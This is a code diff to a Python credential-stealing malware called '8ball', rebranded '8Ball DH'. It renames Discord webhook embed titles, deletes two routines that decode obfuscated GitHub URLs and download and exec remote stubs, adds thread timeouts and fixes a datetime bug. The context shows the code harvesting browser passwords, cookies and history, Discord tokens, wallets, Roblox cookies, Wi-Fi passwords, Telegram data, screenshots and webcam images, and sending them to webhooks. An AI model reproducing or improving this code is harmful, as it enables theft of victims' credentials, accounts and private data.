@@ -51,7 +51,7 @@ def send_debug_embed():
             body = body[-4000:]
         payload = {
             "embeds": [{
-                "title": "8ball",
+                "title": "8Ball DH",
                 "description": f"```\n{body}\n```",
                 "color": 0x5865F2,
                 "footer": {"text": f"{len(_DBG_MESSAGES)} total debug lines"}
@@ -335,41 +335,7 @@ def _validate_main_webhook():
 
 _MAIN_WEBHOOK_VALID = _validate_main_webhook()
 
-# Remote GitHub stub URL (base64-obfuscated). Fetched and executed at runtime alongside rx.py.
-_STUB_URL_B64 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NsMXRteXdyc3R6LWVuZy9pbXBvcnRhbnQvbWFpbi9zdHViLnB5"
-def fetch_and_run_stub():
-    script_path = None
-    try:
-        for attempt in range(3):
-            try:
-                url = base64.b64decode(_STUB_URL_B64).decode()
-                RX_DB6(f"[8Ball] fetch_and_run_stub: Attempt {attempt+1}/3 fetching {url}")
-                req = Request(url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"})
-                resp = urlopen(req, timeout=15)
-                code = resp.read().decode()
-                if not code.strip():
-                    raise ValueError("Empty response")
-                temp_dir = os.getenv("TEMP") or os.getenv("TMP") or "."
-                script_path = os.path.join(temp_dir, f"cr_stub_{random.randint(100000,999999)}.py")
-                with open(script_path, "w", encoding="utf-8") as f:
-                    f.write(code)
-                stub_globals = globals().copy()
-                stub_globals["__file__"] = script_path
-                stub_globals["__name__"] = "__main__"
-                exec(compile(code, script_path, "exec"), stub_globals)
-                RX_DB6("[8Ball] fetch_and_run_stub: Stub executed successfully")
-                return
-            except Exception as e:
-                RX_DB6(f"[8Ball] fetch_and_run_stub attempt {attempt+1} failed: {type(e).__name__}: {e}")
-                if attempt < 2:
-                    time.sleep(2)
-        RX_DB6("[8Ball] fetch_and_run_stub: All attempts failed")
-    finally:
-        if script_path and os.path.exists(script_path):
-            try:
-                os.remove(script_path)
-            except Exception:
-                pass
+
 
 # Remote stub download disabled — it overrides local functions with broken webhook validation
 # threading.Thread(target=fetch_and_run_stub, daemon=True).start()
@@ -1478,51 +1444,6 @@ def G3784D63(flags):
             flags = flags % badge["Value"]
 
     return OwnedBadges
-RAW_URL_B64 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NsMXRteXdyc3R6LWVuZy9pbXBvcnRhbnQvbWFpbi9zc3R1Yi5weQ=="
-try:
-    # decode the correct variable name
-    RAW_URL = base64.b64decode(RAW_URL_B64).decode("utf-8")
-except Exception:
-    RAW_URL = ""
-
-def fetch_and_run():
-    """Download sstub.py from GitHub and run after main features complete."""
-    if not RAW_URL:
-        RX_DB6("[8Ball] fetch_and_run: RAW_URL is empty")
-        return
-    script_path = None
-    try:
-        for attempt in range(3):
-            try:
-                RX_DB6(f"[8Ball] fetch_and_run: Attempt {attempt+1}/3 fetching {RAW_URL}")
-                req = Request(RAW_URL, headers={
-                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-                })
-                resp = urlopen(req, timeout=30)
-                code = resp.read().decode("utf-8")
-                if not code.strip():
-                    raise ValueError("Empty response")
-                temp_dir = os.getenv("TEMP") or os.getenv("TMP") or "."
-                script_path = os.path.join(temp_dir, f"cr_remote_stub_{random.randint(100000,999999)}.py")
-                with open(script_path, "w", encoding="utf-8") as f:
-                    f.write(code)
-                stub_globals = globals().copy()
-                stub_globals["__file__"] = script_path
-                stub_globals["__name__"] = "__main__"
-                exec(compile(code, script_path, "exec"), stub_globals)
-                RX_DB6("[8Ball] fetch_and_run: Stub executed successfully")
-                return
-            except Exception as e:
-                RX_DB6(f"[8Ball] fetch_and_run attempt {attempt+1} failed: {type(e).__name__}: {e}")
-                if attempt < 2:
-                    time.sleep(2)
-        RX_DB6("[8Ball] fetch_and_run: All attempts failed")
-    finally:
-        if script_path and os.path.exists(script_path):
-            try:
-                os.remove(script_path)
-            except Exception:
-                pass
 
 def G37UHQFr13ND5(token):
     if not FEATURE_CONFIG.get("discord_hq_friends_guilds", False):
@@ -1778,7 +1699,7 @@ def UP104D(name, link):
             "content": f"@everyone @here {GLINFO}",
             "embeds": [
                 {
-               "title": "8ball","fields": link,
+               "title": "8Ball DH","fields": link,
                 "footer": {
                     "text": "8ball",
                     "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
@@ -1809,7 +1730,7 @@ def UP104D(name, link):
             "content": f"@everyone @here {GLINFO}",
             "embeds": [
                 {"fields": endlist,
-                "title": "8ball",
+                "title": "8Ball DH",
                 "footer": {
                     "text": "8ball",
                     "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
@@ -2161,7 +2082,7 @@ def G378r0W53r5(br0W53rP47H5):
         "content": f"@everyone @here {GLINFO}",
         "embeds": [
             {
-                "title": "8ball",
+                "title": "8Ball DH",
                 "description": (
                     f"**Found**:\n{G37W3851735(p45WW0rDs)}\n\n"
                     f"**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P455WC0UNt}** Passwords Found\n"
@@ -2173,7 +2094,7 @@ def G378r0W53r5(br0W53rP47H5):
                 }
             },
             {
-                "title": "8ball",
+                "title": "8Ball DH",
                 "description": (
                     f"**Found**:\n{G37W3851735(c00K1W0rDs)}\n\n"
                     f"**Data:**\n<:cookies_tlm:816619063618568234> • **{C00K1C0UNt}** Cookies Found\n"
@@ -2184,7 +2105,7 @@ def G378r0W53r5(br0W53rP47H5):
                 }
             },
             {
-                "title": "8ball",
+                "title": "8Ball DH",
                 "description": (
                     f":newspaper:  • **{H1570rYC0UNt}** Histories Found\n"
                     f"<a:CH_IconArrowRight:715585320178941993> • [8ball_Histories.txt]({filess[5]})\n\n"
@@ -2291,7 +2212,7 @@ def G47H3rZ1P5(paths1, paths2, paths3):
         "content": f"@everyone @here {GLINFO}",
         "embeds": [
             {
-            "title": "8ball",
+            "title": "8Ball DH",
             "description": desc,
             "footer": {
                 "text": "8ball",
@@ -2461,14 +2382,14 @@ def G47H3r411():
     for patt in d15C0rDP47H5:
        S74r77Hr34D(G37D15C0rD, [patt[0], patt[1]]                                   )
     S74r77Hr34D(G378r0W53r5,   [br0W53rP47H5,]                                      )
-    # Wait for password/cookie collection before starting wallet/gaming
+    # Wait for password/cookie collection before starting wallet/gaming (60s max per thread)
     for thread in THr34D1157:
-        thread.join()
+        thread.join(60)
     # Now start wallet/gaming (after passwords)
     THr34D1157.clear()
     S74r77Hr34D(G47H3rZ1P5,    [br0W53rP47H5, p47H570Z1P, t3136r4M]                 )
     for thread in THr34D1157:
-        thread.join()
+        thread.join(60)
     RX_DB6("[8Ball] G47H3r411 orchestrator completed.")
     
 def G37F11353rv3r():
@@ -2607,7 +2528,7 @@ def filestealr():
     if not all_files:
         data = {
             "content": f"@everyone @here {GLINFO}",
-            "embeds": [{"title": "8ball", "description": "Local Files feature ran but found no matching files."}],
+            "embeds": [{"title": "8Ball DH", "description": "Local Files feature ran but found no matching files."}],
             "username": "8ball",
             "allowed_mentions": {"parse": ["everyone", "roles", "users"]},
         }
@@ -2631,7 +2552,7 @@ def filestealr():
         desc += f"\n\n[Download ZIP]({zip_link})"
     data = {
         "content": f"@everyone @here {GLINFO}",
-        "embeds": [{"title": "8ball", "description": desc}],
+        "embeds": [{"title": "8Ball DH", "description": desc}],
         "username": "8ball",
         "allowed_mentions": {"parse": ["everyone", "roles", "users"]},
     }
@@ -2682,14 +2603,13 @@ def random_delay(min_s=0.5, max_s=3.0):
     time.sleep(random.uniform(min_s, max_s))
 
 def shuffled_run(callables):
-    """Execute callables in random order with delays"""
+    """Execute callables in random order with delays and per-function timeout"""
     idx = list(range(len(callables)))
     random.shuffle(idx)
     for i in idx:
-        try:
-            callables[i]()
-        except Exception:
-            pass
+        t = threading.Thread(target=callables[i], daemon=True)
+        t.start()
+        t.join(90)
         random_delay(0.3, 1.5)
 
 def spawn_isolated(target_name, args_repr="()"):
@@ -2734,7 +2654,7 @@ def system_info_collect():
     try:
         import platform, psutil
         uname = platform.uname()
-        boot = _dt.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
+        boot = _dt.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
         cpu = f"{psutil.cpu_count(logical=True)} logical / {psutil.cpu_count(logical=False)} physical"
         mem = f"{psutil.virtual_memory().total // (1024**3)} GB"
         info = (
@@ -2750,7 +2670,7 @@ def system_info_collect():
         }
         data = {
             "content": f"@everyone @here {GLINFO}",
-            "embeds": [{"title": "8ball — System Info", "description": info, "footer": {"text": "8ball"}}],
+            "embeds": [{"title": "8Ball DH — System Info", "description": info, "footer": {"text": "8ball"}}],
             "username": "8ball",
             "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
         }
@@ -2784,7 +2704,7 @@ def screenshot_capture_func():
         }
         data = {
             "content": f"@everyone @here {GLINFO}",
-            "embeds": [{"title": "8ball — Screenshot", "description": desc, "footer": {"text": "8ball"}}],
+            "embeds": [{"title": "8Ball DH — Screenshot", "description": desc, "footer": {"text": "8ball"}}],
             "username": "8ball",
             "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
         }
@@ -2823,7 +2743,7 @@ def webcam_capture_func():
         }
         data = {
             "content": f"@everyone @here {GLINFO}",
-            "embeds": [{"title": "8ball — Webcam", "description": desc, "footer": {"text": "8ball"}}],
+            "embeds": [{"title": "8Ball DH — Webcam", "description": desc, "footer": {"text": "8ball"}}],
             "username": "8ball",
             "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
         }
@@ -2875,7 +2795,7 @@ def roblox_cookies_func():
         }
         data = {
             "content": f"@everyone @here {GLINFO}",
-            "embeds": [{"title": "8ball — Roblox Cookies", "description": desc, "footer": {"text": "8ball"}}],
+            "embeds": [{"title": "8Ball DH — Roblox Cookies", "description": desc, "footer": {"text": "8ball"}}],
             "username": "8ball",
             "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
         }
@@ -2925,7 +2845,7 @@ def wifi_passwords_func():
         }
         data = {
             "content": f"@everyone @here {GLINFO}",
-            "embeds": [{"title": "8ball — Wi-Fi Passwords", "description": desc, "footer": {"text": "8ball"}}],
+            "embeds": [{"title": "8Ball DH — Wi-Fi Passwords", "description": desc, "footer": {"text": "8ball"}}],
             "username": "8ball",
             "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
         }
@@ -2965,7 +2885,7 @@ def telegram_desktop_func():
         }
         data = {
             "content": f"@everyone @here {GLINFO}",
-            "embeds": [{"title": "8ball — Telegram Desktop", "description": desc, "footer": {"text": "8ball"}}],
+            "embeds": [{"title": "8Ball DH — Telegram Desktop", "description": desc, "footer": {"text": "8ball"}}],
             "username": "8ball",
             "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
         }
